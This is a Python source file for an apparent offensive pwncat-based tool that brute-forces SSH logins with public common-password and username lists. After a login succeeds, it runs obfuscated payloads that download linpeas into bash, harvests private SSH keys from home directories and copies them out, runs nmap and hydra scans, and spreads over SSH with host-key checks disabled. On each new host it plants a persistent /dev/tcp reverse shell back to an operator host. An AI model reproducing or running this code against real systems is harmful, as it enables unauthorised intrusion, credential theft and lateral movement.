#!/usr/bin/env python3
import base64
import os
import pwncat.manager
from pwncat.channel import ChannelError
import signal
import sys
import subprocess
import argparse
from pathlib import Path
import time
import requests
from datetime import datetime

parser = argparse.ArgumentParser(description='reverse shell listener')
parser.add_argument('--user', dest='user', type=str,
                    default=None, help='target user')
parser.add_argument('--password', dest='password', type=str,
                    default=None, help='target password')
parser.add_argument('--identity', dest='identity', type=str,
                    default=None, help='target identity (format: base64 encoded single line)')
parser.add_argument('--user-list', dest='user_list', type=str,
                    help='target users file path')
parser.add_argument('--password-list', dest='password_list', type=str,
                    default=None, help='target passwords file path')
parser.add_argument('--identity-list', dest='identity_list', type=str,
                    default=None, help='target identities file path (format: base64 encoded single line per identity)')
parser.add_argument('--payload', dest='payload', type=str,
                    default=base64.b64encode(b'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files'), help='target base64 payload to deliver')
parser.add_argument('--task', dest='task', type=str,
                    default="custom", help='target task name - use custom to execute payload')
parser.add_argument('--target-ip', dest='target_ip', type=str,
                    required=True, help='target ip')
parser.add_argument('--target-port', dest='target_port', type=int,
                    default=22, help='target port')
parser.add_argument('--reverse-shell-host', dest='reverse_shell_host', type=str,
                    required=True, help='reverse shell host to be used as second stage')
parser.add_argument('--reverse-shell-port', dest='reverse_shell_port', type=str,
                    required=True, help='reverse shell port to be used as second stage')
parser.add_argument('--add-default-passwords', dest="add_default_passwords",
                    default=True, action=argparse.BooleanOptionalAction)
parser.add_argument('--default-passwords-url', dest="default_passwords_url",
                    default="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-passwords-shortlist.txt")
parser.add_argument('--add-default-users', dest="add_default_users",
                    default=True, action=argparse.BooleanOptionalAction)
parser.add_argument('--default-users-url', dest="default_users_url",
                    default="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt")

args = parser.parse_args()


def signal_handler(sig, frame):
    session.log('Interrupt caught...')
    session_lock = Path("/tmp/pwncat_connector_session.lock")
    if session_lock.exists():
        session_lock.unlink()
    sys.exit(0)


def execute(session: pwncat.manager.Session, task):
    session.log("starting module")
    try:
        if task == "custom":
            payload = base64.b64encode(f'{args.payload}'.encode("utf-8"))
            result = session.platform.run(
                f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_connector | base64 -d | /bin/bash'",
                cwd="/tmp", timeout=7200)
            session.log(result)
        elif task == "scan2kubeshell":
            payload = base64.b64encode(
                b'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files')
            result = session.platform.run(
                f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_connector_linpeas | base64 -d | /bin/bash'",
                cwd="/tmp", timeout=7200)
            session.log(result)

            result = session.platform.run(
                'rm -f /tmp/ssh_keys.tar /tmp/ssh_keys.tar.gz 2>/dev/null; for f in $(find  /home /root -name .ssh 2>/dev/null | xargs -I {} find {} -type f); do if grep "PRIVATE" $f >/dev/null; then tar -C $(dirname $f) -rvf /tmp/ssh_keys.tar $f 2>/dev/null; fi done; gzip /tmp/ssh_keys.tar',
                cwd="/tmp", timeout=7200)
            session.log(result)

            session.log("copying /tmp/ssh_keys.tar.gz...")
            with session.platform.open('/tmp/ssh_keys.tar.gz', 'rb') as f1:
                with open(f'/tmp/{args.target_ip}_ssh_keys.tar.gz', 'wb') as f2:
                    f2.write(f1.read())

            session.log(
                "creating local /tmp/identities.txt with discovered keys...")
            payload = base64.b64encode(
                f'rm -rf /tmp/ssh_keys; mkdir /tmp/ssh_keys; tar -zxvf /tmp/{args.target_ip}_ssh_keys.tar.gz -C "/tmp/ssh_keys"; cd /tmp/ssh_keys; truncate -s0 /tmp/identities.txt; for k in $(find /tmp/ssh_keys -type f); do cat $k | base64 -w0 >> /tmp/identities.txt; done'.encode('utf-8'))
            result = subprocess.run(
                ['/bin/bash', '-c', f'echo {payload.decode()} | tee /tmp/payload_extractidentites | base64 -d | /bin/bash'], cwd="/tmp", capture_output=True, text=True)
            session.log(result)

            files = ["/tmp/found-users.txt",
                     "/tmp/found-passwords.txt", "/tmp/found-identities.txt"]
            file_list = ", ".join(files)
            session.log(
                f"copying scan requirements: {file_list}...")
            for file in files:
                if Path(file).exists():
                    session.log(f"copying: {file}")
                    with open(file, 'rb') as f1:
                        with session.platform.open(file, 'wb') as f2:
                            f2.write(f1.read())
                else:
                    session.log(f"file not found: {file}")

            session.log("building nmap and hydra scan paylod...")
            with open("scan.sh", 'rb') as f:
                payload = base64.b64encode(f.read())

            session.log("running scan payload...")
            result = session.platform.run(
                f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_connector_scan | base64 -d | /bin/bash'",
                cwd="/tmp", timeout=7200)
            session.log(result)

            files = ["/tmp/scan.json", "/tmp/hydra-targets.txt",
                     "/tmp/sshgobrute.txt", "/tmp/sshgobrute-found.txt"]
            file_list = ", ".join(files)
            session.log(
                f"copying scan results: {file_list}...")
            for file in files:
                if session.platform.Path(file).exists():
                    session.log(
                        f"copying from remote: {file} => /tmp/{args.target_ip}_{os.path.basename(file)}")
                    with session.platform.open(file, 'rb') as f1:
                        with open(f'/tmp/{args.target_ip}_{os.path.basename(file)}', 'wb') as f2:
                            f2.write(f1.read())
                else:
                    session.log(f"remote file not found: {file}")

            session.log(
                f"reading local /tmp/{args.target_ip}_hydra-targets.txt...")
            ssh_targets = []
            with open(f"/tmp/{args.target_ip}_hydra-targets.txt") as f:
                ssh_targets = f.read().splitlines()
            session.log(f"found ssh target - {ssh_targets[0]}")

            # ideally we determine the key using the ssh_keys archive paths
            # and enumerate? but for now we will have to _cheat_ a little

            # build a payload that attempts reconnect if pid returns non-zero
            max_attempts = 10
            sleep = 30
            max_wait = 3600
            connect_payload = base64.b64encode(f"""
SCRIPTNAME=pwncat_reconnect
LOGFILE=/tmp/$SCRIPTNAME.log
function log {{
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
}}
MAXLOG=2
for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{{$i,$((i+1))}} 2>/dev/null || true; done
mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true
# Max number of attempts to start the Docker container
max_attempts={max_attempts}
attempt=0
MAX_WAIT={max_wait}

while true; do
    # Increment the attempt counter
    ((attempt++))
    log "Attempt $attempt of $max_attempts"

    # Try command
    COMMAND="/bin/bash -c 'TASK=scan2kubeshell /bin/bash -i >& /dev/tcp/{args.reverse_shell_host}/{args.reverse_shell_port} 0>&1'"

    # Start the long-running command using nohup in the background
    nohup /bin/bash -c "$COMMAND" >/dev/null 2>&1 &

    # Store the Process ID of the background command
    PID=$!

    # Monitoring loop to check if the process is still running
    START_TIME=$(date +%s)
    while kill -0 $PID 2>/dev/null; do
        NOW=$(date +%s)
        ELAPSED=$(( NOW - START_TIME ))

        if [[ $ELAPSED -ge $MAX_WAIT ]]; then
            log "process wait timeout reached: $MAX_WAIT seconds"
            kill -9 $PID
            exit 1
        else
            log "Process $PID is still running..."
            sleep 10
        fi
    done

    # Wait for the process to finish and capture its exit status
    wait $PID
    EXIT_STATUS=$?

    # Check the exit status of the process
    if [ $EXIT_STATUS -eq 0 ]; then
        log "Process $PID has completed successfully."
        break
    else
        log "Process $PID has finished with an error: $EXIT_STATUS"
        exit $EXIT_STATUS
    fi

    # Check if maximum attempts have been reached
    if [[ $attempt -eq $max_attempts ]]; then
        log "Maximum attempts reached, failing now."
        exit 1
    fi

    # Wait for a little while before retrying
    log "waiting {sleep} seconds..."
    sleep {sleep}
done

exit 0
""".encode("utf-8"))
            payload = base64.b64encode(f'''
for h in $(cat /tmp/hydra-targets.txt | grep -v $(ip -o -f inet addr show | awk \'/scope global/ {{print $4}}\' | head -1 | awk -F \'/\' \'{{ print $1 }}\')); do
    echo "connecting to: $h..."
    ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i ~/.ssh/secret_key $h "nohup /bin/bash -c 'echo {connect_payload.decode()} | tee /tmp/payload_connect | base64 -d | /bin/bash -' >/dev/null 2>&1 &"
    echo "result: $?"
    echo "connection complete."
done'''.encode("utf-8"))
            session.log(
                f"starting reverse shell hand off on remote host off via ssh: {payload.decode()}")
            result = session.platform.run(
                f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_connector_ssh_reverse_shell | base64 -d | /bin/bash'",
                cwd="/tmp", timeout=7200)

            session.log("connector session complete")
    except Exception as e:
        session.log(f'Error executing bash script: {e}')


def attempt_ssh_connection(user, credential, credential_type, target_ip, target_port, task):
    """
    Attempt to establish an SSH connection using either a password or an identity file.

    Args:
        user (str): The username for the SSH connection.
        credential (str): The password or the path to the identity file.
        credential_type (str): 'password' or 'identity' to indicate the credential type.
        target_ip (str): The target IP address for the SSH connection.
        target_port (int): The target port number for the SSH connection.
        task (str): The task to execute upon successful connection.

    Returns:
        bool: True if the connection was successful, False otherwise.
    """
    with pwncat.manager.Manager() as manager:
        # Load modules and set configuration
        manager.load_modules(str(Path.cwd() / "plugins"))
        manager.config.set("verbose", True, glob=True)

        try:
            # Establish a pwncat session
            session_args = {
                "platform": "linux",  # Use colon for correct syntax
                "host": target_ip,
                "port": target_port,
                "user": user
            }
            if credential_type == 'password':
                session_args["password"] = credential
            elif credential_type == 'identity':
                session_args["identity"] = credential

            print(
                f"attempting ssh conection: {user}:{credential}")
            session = manager.create_session(**session_args)

            # Correct file writing with encoding
            with open('/tmp/found-users.txt', 'a+') as f:
                # Ensure bytes are written
                f.write(f'{user}\n')
            if credential_type == 'password':
                with open('/tmp/found-passwords.txt', 'a+') as f:
                    f.write(f'{credential}\n')
                with open('/tmp/found-user-passwords.txt', 'a+') as f:
                    f.write(
                        f'{user}:{credential}\n')
            elif credential_type == 'identity':
                with open('/tmp/found-identities.txt', 'a+') as f:
                    f.write(f'{credential}\n')
                with open('/tmp/found-user-identities.txt', 'a+') as f:
                    f.write(
                        f'{user}:{credential}\n')

            execute(session, task)  # Execute the specified task
            # Return True if connection and task execution were successful
            return True, False, session
        except ChannelError as e:
            # Custom function to handle different ChannelError cases
            retry = is_retryable_error(e)
            return False, retry, None


def is_retryable_error(error):
    """
    Determine if the ChannelError encountered during the SSH connection attempt is retryable.

    Args:
        error (ChannelError): The exception encountered during the SSH connection attempt.

    Returns:
        bool: True if the error is retryable, False otherwise.
    """
    if error.args[0] in [
        'ssh authentication failed: Authentication failed.',
        'ssh connection failed: No authentication methods available',
        'ssh connection failed: Error reading SSH protocol banner[Errno 104] Connection reset by peer'
    ]:
        print("Authentication failed: Bad password or user name.")
        # return false to indicte we should not retry
        return False
    elif error.args[0] == 'ssh connection failed: Error reading SSH protocol banner':
        # return try to indicate that we should retry on connection failed
        print("SSH connection failed - retry required.")
        return True
    else:
        # Handle other types of errors or re-raise the exception
        raise error


if __name__ == '__main__':
    # add interrupt handler for cleanup of lock file
    signal.signal(signal.SIGINT, signal_handler)

    users = []
    passwords = []
    identities = []
    payload = args.payload

    if args.user_list is not None and Path(args.user_list).exists():
        with open(str(Path(args.user_list)), 'r') as f:
            users = f.read().splitlines()
    elif args.user is not None:
        users.append(args.user)

    if args.password_list is not None and Path(args.password_list).exists():
        with open(str(Path(args.password_list)), 'r') as f:
            passwords = f.read().splitlines()
    elif args.password is not None:
        passwords.append(args.password)

    if args.identity_list is not None and Path(args.identity_list).exists():
        with open(str(Path(args.identity_list)), 'r') as f:
            for i in f.read().splitlines():
                identities.append(base64.b64decode(i))
    elif args.identity is not None:
        identities.append(base64.b64decode(args.identity))

    # check for valid state
    if not len(users):
        raise Exception("Either --user or --user-list are required")

    if not len(passwords) and not len(identities):
        raise Exception(
            "One of --password, --identity, --password-list, or --identity-list are required")

    # reset found users
    Path("/tmp/found-users.txt").unlink(True)
    Path("/tmp/found-passwords.txt").unlink(True)
    Path("/tmp/found-user-passwords.txt").unlink(True)
    Path("/tmp/found-identities.txt").unlink(True)
    Path("/tmp/found-user-identities.txt").unlink(True)

    # append default passwords as required
    if args.add_default_passwords:
        url = args.default_passwords_url
        password_list = requests.get(url).content
        passwords += password_list.splitlines()

    # append default users as required
    if args.add_default_users:
        url = args.default_users_url
        user_list = requests.get(url).content
        users += user_list.splitlines()

    # enumerate users
    success = False
    max_retries = 3  # Maximum retry attempts

    session_lock = Path("/tmp/pwncat_connector_session.lock")
    session_lock.touch()

    try:
        for credential_type in ["password", "identity"]:
            for user in users:
                credentials = passwords if credential_type == 'password' else identities
                for credential in credentials:
                    retries = 0  # Retry counter
                    while retries < max_retries:
                        success, retry, session = attempt_ssh_connection(
                            user, credential, credential_type, args.target_ip, args.target_port, args.task)
                        if success:
                            print(
                                f"Successful {credential_type} authentication: {user} with {credential}")
                            break  # Exit the credential loop if a successful connection was made
                        elif retry:
                            retries += 1
                            print(f"Attempt {retries} failed for {user}.")
                            if retries < max_retries:
                                print(f"Retrying... ({retries}/{max_retries})")
                                # Sleep to avoid immediate reconnection
                                time.sleep(retries*30)
                            else:
                                print(
                                    f"Maximum retries reached for {user} with {credential_type}.")
                        else:
                            # failed authentication - continue iterating username/credentials
                            print(
                                f"Failed {credential_type} authentication: {user} with {credential}")
                            break
                    if success:
                        break  # Exit the credential loop if a successful connection was made
                if success:
                    break  # Exit the user loop if a successful connection was made
            if success:
                break  # Exit the credential_type loop if a successful connection was made

    except Exception as e:
        print(f"exception: {e}")
        pass

    print("Backup pwncat_connector.log...")
    pwncat_log = Path("/tmp/pwncat_connector.log")
    if pwncat_log.exists():
        dest_log = Path(
            f"/tmp/pwncat_connector_{args.task}.log")
        print(
            f"Copying successful session log {pwncat_log.as_posix()} => {dest_log.as_posix()}")
        session.log(
            f"Copying session log {pwncat_log.as_posix()} => {dest_log.as_posix()}")
        source = pwncat_log.read_bytes()
        dest_log.write_bytes(source)

    if session_lock.exists():
        session_lock.unlink()

    exit(0)
